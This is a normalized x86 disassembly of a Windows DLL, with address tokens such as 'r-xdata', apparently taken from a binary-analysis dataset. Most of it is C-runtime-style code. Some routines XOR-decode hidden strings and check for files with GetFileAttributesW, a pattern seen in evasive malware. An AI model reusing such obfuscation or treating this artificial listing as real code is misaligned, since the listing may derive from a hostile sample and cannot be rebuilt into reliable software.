lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x44 ]
call sub_100275d9
add esp 0x18
push eax
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_10060a86
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x38 ]
mov esi eax
call sub_10034a80
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10069d0f
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x40 ] eax
je r-xdata
or [ edi ] 0x1
or [ edi ] 0x2
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
mov [ ebx ] esi
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x3c ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_1004642f
retn 0x20
sub_10023bb0
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_1001da0a
mov edx [ ebp + 0x10 ]
xor ebx ebx
cmp edx ebx
jne r-xdata
cmp [ ebp + 0x8 ] ebx
jne r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp [ ebp + 0xc ] ebx
je r-xdata
call sub_1006299d
mov [ eax ] 0x16
call sub_100427ff
cmp [ ebp - 0x4 ] bl
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
push esi
mov esi 0x7fffffff
cmp edx esi
jbe r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
pop ebx
leave
retn
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0x10 ]
cmp ecx ebx
jne r-xdata
call sub_1006299d
mov [ eax ] 0x16
call sub_100427ff
jmp r-xdata
push [ eax + 0x8 ]
lea eax [ ebp - 0x10 ]
push edx
push [ ebp + 0xc ]
push edx
push [ ebp + 0x8 ]
push 0x1001
push ecx
push eax
call sub_1005e3b7
add esp 0x20
cmp eax ebx
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
push edx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10049cb7
add esp 0x10
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
add eax 0xfffffffe
call sub_1006299d
mov [ eax ] 0x16
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
pop esi
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_10023c9a
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x5
push esi
push edi
ja r-xdata
xor eax eax
cmp [ ebp + 0xc ] 0x0
je r-xdata
xor edi edi
inc edi
push edi
push 0x8
call sub_10067d3a
mov esi eax
pop ecx
pop ecx
test esi esi
jne r-xdata
push edi
push 0xd8
call sub_10067d3a
pop ecx
pop ecx
mov [ esi ] eax
test eax eax
jne r-xdata
call sub_1006299d
mov [ eax ] 0xc
push edi
push 0x220
call sub_10067d3a
pop ecx
pop ecx
mov [ esi + 0x4 ] eax
test eax eax
jne r-xdata
push esi
call sub_10035d06
mov eax [ esi ]
mov ecx rw-data
call sub_10080d8a
push [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov edx [ esi ]
call sub_1008124f
pop ecx
test eax eax
jne r-xdata
push [ esi ]
call sub_10035d06
push esi
call sub_10035d06
pop ecx
jmp r-xdata
push [ esi + 0x4 ]
mov eax [ esi ]
push [ eax + 0x4 ]
call sub_10021152
pop ecx
pop ecx
test eax eax
je r-xdata
push [ esi ]
call sub_10070772
push [ esi ]
call sub_10006356
push esi
call sub_10035d06
add esp 0xc
jmp r-xdata
pop ecx
jmp r-xdata
mov eax [ esi + 0x4 ]
mov [ eax ] edi
mov eax [ esi + 0x4 ]
mov [ eax ] edi
push [ esi + 0x4 ]
call sub_10035d06
push [ esi ]
call sub_10070772
push [ esi ]
call sub_10006356
push esi
call sub_10035d06
add esp 0x10
xor esi esi
jmp r-xdata
pop edi
pop esi
pop ebp
retn
mov eax esi
jmp r-xdata
sub_10023d8f
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov edx eax
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
mov cx [ ebp + 0xc ]
cmp [ eax ] cx
je r-xdata
cmp [ eax ] cx
jne r-xdata
pop ebp
retn
xor eax eax
sub eax 0x2
cmp eax edx
je r-xdata
sub_10023dc0
push ebp
mov ebp esp
sub esp 0x108
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
xor ebx ebx
lea edi [ ebp - 0xf4 ]
lea edx [ ebp - 0xf8 ]
mov esi ecx
mov [ ebp - 0xe8 ] eax
mov [ ebp - 0xf8 ] ebx
mov [ ebp - 0xf4 ] ebx
call sub_100185d0
test eax eax
je r-xdata
lea edx [ ebp - 0x14 ]
mov eax 0x105
mov [ ebp - 0xfc ] ebx
call sub_10053240
lea ecx [ ebp - 0xfc ]
push ecx
push edx
call sub_100724e0
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0xe4 ]
lea eax [ ebx + 0x42 ]
call sub_10053240
lea eax [ ebx + 0x1 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x4
lea edx [ ebp - 0x4c ]
mov eax 0x10e
mov [ ebp - 0xf0 ] ebx
call sub_10053240
lea eax [ ebp - 0xf0 ]
push eax
mov ecx edx
push ecx
call sub_100724e0
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0xc4 ]
mov eax 0xc5
call sub_10053240
mov eax 0x2
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x4
lea edx [ ebp - 0x60 ]
mov eax 0xe4
mov [ ebp - 0xec ] ebx
call sub_10053240
lea edx [ ebp - 0xec ]
push edx
lea eax [ ebp - 0x60 ]
push eax
call sub_100724e0
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0xcc ]
mov eax 0xf5
call sub_10053240
push 0x20
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
cmp eax ebx
je r-xdata
lea edx [ ebp - 0xd4 ]
mov eax 0xb4
call sub_10053240
mov eax 0x3
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x4
xor eax eax
fldz
mov [ eax + 0x4 ] ebx
fstp [ eax + 0x10 ]
mov [ eax + 0x8 ] ebx
mov [ eax ] r--data
mov [ eax + 0xc ] ebx
mov [ eax + 0x18 ] ebx
mov [ eax + 0x1c ] ebx
jmp r-xdata
lea edx [ ebp - 0x34 ]
mov eax 0x130
call sub_10053240
mov ebx ecx
mov edi eax
call sub_1006b3f0
xor ebx ebx
jmp r-xdata
mov ecx [ ebp - 0xf8 ]
mov esi [ ebp - 0xe8 ]
mov [ esi ] eax
cmp ecx ebx
je r-xdata
lea edx [ ebp - 0x38 ]
mov eax 0x49
call sub_10053240
mov ecx [ ebp - 0xe8 ]
mov edi [ ecx ]
mov ebx eax
call sub_100279a0
mov esi [ ebp - 0xe8 ]
xor ebx ebx
jmp r-xdata
mov eax [ ebp - 0xf4 ]
cmp eax ebx
je r-xdata
lea edx [ ebp - 0x34 ]
mov eax 0x58
call sub_10053240
mov edx [ ebp - 0xe8 ]
mov edi [ edx ]
mov ebx eax
call sub_10067ea0
mov esi [ ebp - 0xe8 ]
xor ebx ebx
jmp r-xdata
mov eax [ ebp - 0xfc ]
cmp eax ebx
je r-xdata
lea edx [ ebp - 0x38 ]
mov eax 0x9e
call sub_10053240
fldz
mov ecx [ esi ]
fstp [ ecx + 0x10 ]
push eax
call sub_1003bfca
mov eax [ esi ]
fstp [ eax + 0x10 ]
add esp 0x4
jmp r-xdata
mov eax [ ebp - 0xf0 ]
cmp eax ebx
je r-xdata
lea edx [ ebp - 0x3c ]
mov eax 0x10f
call sub_10053240
mov eax [ esi ]
mov [ eax + 0x18 ] ebx
push eax
call sub_1003bfca
fnstcw [ ebp - 0xe6 ]
movzx eax [ ebp - 0xe6 ]
mov edx [ esi ]
add esp 0x4
or eax 0xc00
mov [ ebp - 0x100 ] eax
fldcw [ ebp - 0x100 ]
fistp [ ebp - 0x104 ]
mov eax [ ebp - 0x104 ]
mov [ edx + 0x18 ] eax
fldcw [ ebp - 0xe6 ]
jmp r-xdata
mov eax [ ebp - 0xec ]
cmp eax ebx
je r-xdata
mov ecx [ ebp - 0x8 ]
pop edi
pop esi
xor ecx ebp
xor eax eax
pop ebx
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x4
sub_1002405f
mov edi edi
push ebp
mov ebp esp
sub esp 0x4c
push esi
lea eax [ ebp - 0x4c ]
push eax
call [ GetStartupInfoW@IAT ]
push 0x40
push 0x20
pop esi
push esi
call sub_10067d3a
pop ecx
pop ecx
xor ecx ecx
cmp eax ecx
jne r-xdata
lea edx [ eax + 0x800 ]
mov [ rw-data ] eax
mov [ rw-data ] esi
cmp eax edx
jae r-xdata
or eax 0xffffffff
jmp r-xdata
push ebx
push edi
cmp [ ebp - 0x1a ] cx
je r-xdata
add eax 0x5
pop esi
leave
retn
xor ebx ebx
mov eax [ ebp - 0x18 ]
cmp eax ecx
je r-xdata
or [ eax - 0x5 ] 0xffffffff
mov [ eax - 0x1 ] 0xa00
mov [ eax + 0x3 ] ecx
mov [ eax + 0x1f ] 0xa00
mov [ eax + 0x21 ] 0xa
mov [ eax + 0x33 ] ecx
mov [ eax + 0x2f ] cl
mov esi [ rw-data ]
add eax 0x40
lea edx [ eax - 0x5 ]
add esi 0x800
cmp edx esi
jb r-xdata
mov [ esi + 0x4 ] 0x81
test ebx ebx
jne r-xdata
cmp eax 0xfffffffe
je r-xdata
mov ebx [ eax ]
add eax 0x4
mov [ ebp - 0x4 ] eax
add eax ebx
mov esi 0x800
mov [ ebp - 0x8 ] eax
cmp ebx esi
jl r-xdata
lea eax [ ebx - 0x1 ]
neg eax
sbb eax eax
add eax 0xfffffff5
push 0xfffffff6
pop eax
jmp r-xdata
or [ esi + 0x4 ] 0x80
jmp r-xdata
cmp [ rw-data ] ebx
jge r-xdata
mov ebx esi
or [ esi + 0x4 ] 0x40
mov [ esi ] 0xfffffffe
test edi edi
je r-xdata
push eax
call [ GetStdHandle@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
inc ebx
cmp ebx 0x3
jl r-xdata
xor edi edi
test ebx ebx
jle r-xdata
mov edi rw-data
mov esi ebx
shl esi 0x6
add esi [ rw-data ]
mov eax [ esi ]
cmp eax 0xffffffff
je r-xdata
push [ rw-data ]
call [ SetHandleCount@IAT ]
xor eax eax
push edi
call [ GetFileType@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
cmp eax 0xffffffff
je r-xdata
mov ebx [ rw-data ]
add [ rw-data ] 0x20
lea ecx [ eax + 0x800 ]
mov [ edi ] eax
cmp eax ecx
jae r-xdata
and eax 0xff
mov [ esi ] edi
cmp eax 0x2
jne r-xdata
add [ ebp - 0x8 ] 0x4
inc edi
inc [ ebp - 0x4 ]
cmp edi ebx
jl r-xdata
cmp eax 0xfffffffe
je r-xdata
add edi 0x4
cmp [ rw-data ] ebx
jl r-xdata
add eax 0x5
cmp eax 0x3
jne r-xdata
or [ esi + 0x4 ] 0x40
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov cl [ ecx ]
test cl 0x1
je r-xdata
push 0x40
push 0x20
call sub_10067d3a
pop ecx
pop ecx
test eax eax
je r-xdata
jmp r-xdata
or [ eax - 0x5 ] 0xffffffff
and [ eax + 0x3 ] 0x0
and [ eax + 0x1f ] 0x80
and [ eax + 0x33 ] 0x0
mov [ eax - 0x1 ] 0xa00
mov [ eax + 0x20 ] 0xa0a
mov [ eax + 0x2f ] 0x0
mov ecx [ edi ]
add eax 0x40
add ecx esi
lea edx [ eax - 0x5 ]
cmp edx ecx
jb r-xdata
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
je r-xdata
or [ esi + 0x4 ] 0x8
test cl 0x8
jne r-xdata
or eax 0xffffffff
jmp r-xdata
inc [ esi + 0x8 ]
jmp r-xdata
mov esi edi
and esi 0x1f
mov eax edi
sar eax 0x5
shl esi 0x6
add esi [ eax * 4 + rw-data ]
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ esi ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax ]
mov [ esi + 0x4 ] al
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
je r-xdata
push eax
call [ GetFileType@IAT ]
test eax eax
je r-xdata
pop edi
pop ebx
inc [ esi + 0x8 ]
sub_100242b0
push ebp
mov ebp esp
push ecx
mov edx [ ebp + 0x10 ]
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
mov ecx [ ebp + 0xc ]
cmp ecx [ eax ]
jne r-xdata
cmp ecx edx
je r-xdata
cmp edx eax
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
pop esi
mov esp ebp
pop ebp
retn 0xc
cmp [ ecx + 0x15 ] 0x0
mov edx ecx
jne r-xdata
mov ecx esi
call sub_100487f0
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
pop esi
mov esp ebp
pop ebp
retn 0xc
push edx
lea edx [ ebp - 0x4 ]
push edx
mov ecx esi
call sub_100359d0
mov ecx [ ebp + 0xc ]
cmp ecx [ ebp + 0x10 ]
jne r-xdata
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x15 ] 0x0
jne r-xdata
mov eax [ ecx + 0x4 ]
cmp [ eax + 0x15 ] 0x0
jne r-xdata
mov ecx eax
mov eax [ ecx ]
cmp [ eax + 0x15 ] 0x0
jne r-xdata
mov [ ebp + 0xc ] eax
cmp ecx [ eax + 0x8 ]
jne r-xdata
mov [ ebp + 0xc ] ecx
jmp r-xdata
nop
mov ecx eax
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
cmp [ eax + 0x15 ] 0x0
je r-xdata
mov ecx eax
mov eax [ ecx ]
cmp [ eax + 0x15 ] 0x0
je r-xdata
sub_1002435e
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
or edi 0xffffffff
test [ esi + 0xc ] 0x40
jne r-xdata
mov ebx [ ebp + 0x8 ]
cmp ebx edi
je r-xdata
push esi
call sub_10041a47
pop ecx
mov edx rw-data
cmp eax edi
je r-xdata
mov eax edi
mov eax [ esi + 0xc ]
test al 0x1
jne r-xdata
mov ecx edx
cmp eax 0xfffffffe
je r-xdata
cmp [ esi + 0x8 ] 0x0
jne r-xdata
test al al
jns r-xdata
call sub_1006299d
mov [ eax ] 0x16
call sub_100427ff
cmp eax edi
je r-xdata
mov ecx eax
and ecx 0x1f
mov ebx eax
sar ebx 0x5
shl ecx 0x6
add ecx [ ebx * 4 + rw-data ]
jmp r-xdata
mov eax [ esi ]
cmp eax [ esi + 0x8 ]
jne r-xdata
push esi
call sub_100109dd
pop ecx
test al 0x2
jne r-xdata
mov eax edx
cmp eax 0xfffffffe
je r-xdata
test [ ecx + 0x24 ] 0x7f
jne r-xdata
dec [ esi ]
test [ esi + 0xc ] 0x40
mov eax [ esi ]
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov ecx eax
and eax 0x1f
sar ecx 0x5
shl eax 0x6
add eax [ ecx * 4 + rw-data ]
jmp r-xdata
mov [ eax ] bl
cmp [ eax ] bl
je r-xdata
inc eax
mov [ esi ] eax
test [ eax + 0x24 ] 0x80
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ esi + 0xc ]
inc [ esi + 0x4 ]
and eax 0xffffffef
or eax 0x1
mov [ esi + 0xc ] eax
mov eax ebx
and eax 0xff
jmp r-xdata
inc eax
mov [ esi ] eax
jmp r-xdata
sub_10024460
push ebp
mov ebp esp
sub esp 0x128
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
test esi esi
jne r-xdata
lea edx [ ebp - 0x98 ]
mov eax 0xe8
call sub_10045930
push rw-data
push esi
mov ecx edx
call sub_10045dd0
add esp 0x8
test eax eax
je r-xdata
lea eax [ esi + 0x1 ]
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0xe0 ]
mov eax 0x29
call sub_10045930
push rw-data
push esi
mov ecx edx
call sub_10045dd0
add esp 0x8
test eax eax
je r-xdata
mov eax 0x2
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x128 ]
mov eax 0x28
call sub_10045930
push rw-data
push esi
mov ecx edx
call sub_10045dd0
add esp 0x8
test eax eax
je r-xdata
mov eax 0x3
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x50 ]
mov eax 0xb2
call sub_10045930
push rw-data
push esi
mov ecx edx
call sub_10045dd0
mov ecx [ ebp - 0x4 ]
add esp 0x8
neg eax
sbb eax eax
xor ecx ebp
and eax 0x5
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov eax 0x4
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
sub_10024560
push ebp
mov ebp esp
sub esp 0xa4
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ r--data ]
xor eax eax
jmp r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffe8
and edx 0xff
mov [ ebp + eax * 2 - 0x54 ] dx
inc eax
cmp eax 0x27
jb r-xdata
push esi
mov esi [ GetFileAttributesW@IAT ]
lea ecx [ ebp - 0x54 ]
xor eax eax
push ecx
mov [ ebp - 0x6 ] ax
call esi
cmp eax 0xffffffff
je r-xdata
lea edx [ ebp - 0xa4 ]
mov eax 0xc
call sub_100367b0
push edx
call esi
xor ecx ecx
cmp eax 0xffffffff
setne cl
pop esi
mov eax ecx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov eax 0x1
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
sub_10024600
push ebp
mov ebp esp
push 0xffffffff
push sub_10087ba9
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
xor eax eax
mov [ ebp - 0x10 ] eax
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] eax
mov [ esi ] cx
mov edx [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
mov eax [ edx + 0x10 ]
add eax [ ebx + 0x10 ]
mov edi [ esi + 0x10 ]
mov [ ebp - 0x10 ] 0x1
cmp edi eax
ja r-xdata
mov edx [ ebp + 0xc ]
push 0xffffffff
push 0x0
push edx
mov ecx esi
call sub_10017b50
push 0xffffffff
push 0x0
push ebx
mov ecx esi
call sub_10017b50
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
cmp [ esi + 0x14 ] eax
je r-xdata
push 0x1
push eax
mov ecx esi
call sub_10070030
test al al
je r-xdata
cmp [ esi + 0x14 ] 0x8
mov [ esi + 0x10 ] edi
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
xor ecx ecx
mov [ eax + edi * 2 ] cx
sub_100246ac
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x18 ]
push ebx
push esi
mov esi [ ebp + 0xc ]
sub esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0x14 ]
sub edi [ ebp + 0x10 ]
test eax eax
jne r-xdata
mov ebx [ eax ]
mov eax [ eax + 0x4 ]
call sub_10062fa9
mov ebx [ eax + 0x4 ]
call sub_10008a22
jmp r-xdata
push eax
push edi
push [ ebp + 0x10 ]
push esi
push [ ebp + 0x8 ]
push 0x1000
push ebx
push 0x0
call sub_1005e3b7
add esp 0x20
test eax eax
jne r-xdata
mov eax esi
cmp esi edi
jl r-xdata
test ebx ebx
jne r-xdata
sub eax 0x2
call sub_1006299d
mov [ eax ] 0x16
mov eax 0x7fffffff
jmp r-xdata
push eax
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_100044b8
add esp 0xc
test eax eax
jne r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn
cmp esi edi
je r-xdata
cmp esi edi
setge al
lea eax [ eax + eax - 0x1 ]
jmp r-xdata
sub_10024740
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x18 ]
push esi
mov esi [ ebp + 0xc ]
sub esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0x14 ]
sub edi [ ebp + 0x10 ]
sar esi 0x1
sar edi 0x1
test eax eax
jne r-xdata
mov eax [ eax ]
call sub_10062fa9
mov eax [ eax + 0x4 ]
jmp r-xdata
push edi
push [ ebp + 0x10 ]
push esi
push [ ebp + 0x8 ]
push 0x1000
push eax
call sub_100213f2
add esp 0x18
test eax eax
jne r-xdata
mov edx esi
cmp esi edi
jl r-xdata
test eax eax
jne r-xdata
sub eax 0x2
call sub_1006299d
mov [ eax ] 0x16
mov eax 0x7fffffff
jmp r-xdata
mov ecx [ ebp + 0x10 ]
mov eax [ ebp + 0x8 ]
push ebx
jmp r-xdata
mov edx edi
pop edi
pop esi
pop ebp
retn
test edx edx
jg r-xdata
mov bx [ eax ]
cmp bx [ ecx ]
jne r-xdata
xor eax eax
movzx eax [ eax ]
cmp ax [ ecx ]
sbb eax eax
and eax 0xfffffffe
inc eax
jmp r-xdata
add eax 0x2
add ecx 0x2
dec edx
cmp esi edi
je r-xdata
pop ebx
test eax eax
jne r-xdata
cmp esi edi
setge al
lea eax [ eax + eax - 0x1 ]
jmp r-xdata
sub_10024810
push ebp
mov ebp esp
push 0xffffffff
push sub_10088799
mov eax [ fs : 0x0 ]
push eax
sub esp 0x90
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
xor ebx ebx
push 0x20
mov esi ecx
mov [ ebp - 0x9c ] ebx
call sub_1001f84c
mov edi eax
add esp 0x4
mov [ ebp - 0x9c ] edi
mov [ ebp - 0x4 ] ebx
cmp edi ebx
je r-xdata
xor edi edi
xor eax eax
mov [ edi + 0x14 ] 0x7
mov [ edi + 0x10 ] ebx
mov [ edi ] ax
push 0x9
push r--data
mov ecx edi
mov [ ebp - 0x4 ] 0x1
call sub_1005ddc0
mov [ edi + 0x1c ] ebx
jmp r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x79
and edx 0xff
mov [ ebp + eax * 2 - 0x2c ] dx
inc eax
cmp eax 0x7
jb r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov ecx [ r--data ]
xor eax eax
jmp r-xdata
xor eax eax
test [ ebp + 0x8 ] 0x4
mov [ ebp - 0x1e ] ax
jne r-xdata
test [ ebp + 0x8 ] 0x10
jne r-xdata
lea edx [ ebp - 0x1c ]
mov eax 0xe4
call sub_10045930
lea edx [ ebp - 0x50 ]
mov eax 0x102
call sub_10045930
mov ecx edx
push ecx
lea edx [ ebp - 0x1c ]
lea ecx [ ebp - 0x2c ]
call sub_10005e10
test [ ebp + 0x8 ] 0x20
jne r-xdata
lea edx [ ebp - 0x1c ]
mov eax 0x98
call sub_10045930
lea edx [ ebp - 0x58 ]
mov eax 0x7f
call sub_10045930
push edx
lea edx [ ebp - 0x1c ]
lea ecx [ ebp - 0x2c ]
call sub_10005e10
test [ ebp + 0x8 ] 0x8
jne r-xdata
lea edx [ ebp - 0x1c ]
mov eax 0xff
call sub_10045930
lea edx [ ebp - 0x5c ]
mov eax 0x115
call sub_10045930
mov eax edx
push eax
lea edx [ ebp - 0x1c ]
lea ecx [ ebp - 0x2c ]
call sub_10005e10
test [ ebp + 0x8 ] 0x1
jne r-xdata
lea edx [ ebp - 0x1c ]
mov eax 0x75
call sub_10045930
lea edx [ ebp - 0x58 ]
mov eax 0x142
call sub_10045930
mov ecx edx
push ecx
lea edx [ ebp - 0x1c ]
lea ecx [ ebp - 0x2c ]
call sub_10005e10
test [ ebp + 0x8 ] 0x2
jne r-xdata
lea edx [ ebp - 0x1c ]
mov eax 0x2e
call sub_10045930
lea edx [ ebp - 0x5c ]
mov eax 0xa5
call sub_10045930
push edx
lea edx [ ebp - 0x1c ]
lea ecx [ ebp - 0x2c ]
call sub_10005e10
push edi
call sub_1005b4b0
cmp edi ebx
je r-xdata
lea edx [ ebp - 0x68 ]
mov eax 0x119
call sub_10045930
lea edx [ ebp - 0x98 ]
mov eax 0x3
call sub_10045930
mov eax edx
push eax
lea edx [ ebp - 0x68 ]
lea ecx [ ebp - 0x2c ]
call sub_10005e10
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
cmp [ edi + 0x14 ] 0x8
jb r-xdata
xor ecx ecx
mov [ edi + 0x14 ] 0x7
mov [ edi + 0x10 ] ebx
push edi
mov [ edi ] cx
call sub_100187af
add esp 0x4
mov eax [ edi ]
push eax
call sub_100187af
add esp 0x4
sub_10024a24
mov edi edi
push ebp
mov ebp esp
test [ ebp + 0x8 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_100187af
pop ecx
sub_10024a46
mov edi edi
push ebp
mov ebp esp
push esi
call sub_10062fa9
mov eax [ eax + 0x4 ]
mov esi [ ebp + 0x8 ]
mov [ esi ] eax
call sub_100190d3
push 0x2
push 0x100
mov [ esi + 0x4 ] eax
call sub_10067d3a
pop ecx
pop ecx
mov [ esi + 0x8 ] eax
test eax eax
je r-xdata
call sub_1000447b
and [ esi + 0xc ] 0x0
mov [ esi + 0x8 ] eax
push 0x200
call sub_1000447b
push eax
push [ esi + 0x8 ]
call sub_1007f5d0
add esp 0xc
mov [ esi + 0xc ] 0x1
jmp r-xdata
mov eax esi
pop esi
pop ebp
retn
sub_10024aa6
mov edi edi
push ebp
mov ebp esp
sub esp 0x54
movsx eax [ ebp + 0x28 ]
push esi
mov esi [ ebp + 0x20 ]
push edi
xor edi edi
add eax 0xffffffbf
mov [ ebp - 0x4 ] edi
cmp eax 0x38
ja r-xdata
or [ esi ] 0x2
movzx eax [ eax + lookup_table_10024d92 ]
jmp [ eax * 4 + jump_table_10024d36 ]
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
pop edi
mov [ eax + 0x4 ] ecx
pop esi
leave
retn 0x28
or [ esi ] 0x1
push [ ebp + 0x24 ]
mov eax [ ecx ]
push esi
push [ ebp + 0x1c ]
lea edx [ ebp - 0xc ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edx
call [ eax + 0x10 ]
mov eax [ ebp - 0xc ]
mov [ ebp + 0xc ] eax
mov eax [ ebp - 0x8 ]
push [ ebp + 0x24 ]
mov eax [ ecx ]
push esi
push [ ebp + 0x1c ]
lea edx [ ebp - 0x14 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edx
call [ eax + 0x14 ]
mov eax [ ebp - 0x14 ]
mov [ ebp + 0xc ] eax
mov eax [ ebp - 0x10 ]
jmp r-xdata
push r--data
lea eax [ ebp - 0x24 ]
lea eax [ ebp - 0x4 ]
push eax
push 0x63
push edi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push ecx
call sub_1001b303
or [ esi ] eax
add esp 0x18
test [ esi ] 0x2
jne r-xdata
mov eax [ ebp + 0x24 ]
add eax 0xc
push eax
push 0x1f
push r--data
lea eax [ ebp - 0x2c ]
jmp r-xdata
mov eax [ ebp + 0x24 ]
add eax 0x8
push eax
push 0x17
mov eax [ ebp + 0x24 ]
add eax 0x8
push eax
push 0xb
jmp r-xdata
mov eax [ ebp + 0x24 ]
add eax 0x1c
push eax
push 0x16e
jmp r-xdata
lea eax [ ebp - 0x4 ]
push eax
push 0xc
push 0x1
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push ecx
call sub_1001b303
or [ esi ] eax
add esp 0x18
test [ esi ] 0x2
jne r-xdata
mov eax [ ebp + 0x24 ]
add eax 0x4
push eax
push r--data
lea eax [ ebp - 0x34 ]
jmp r-xdata
push r--data
push edi
lea eax [ ebp + 0x14 ]
push eax
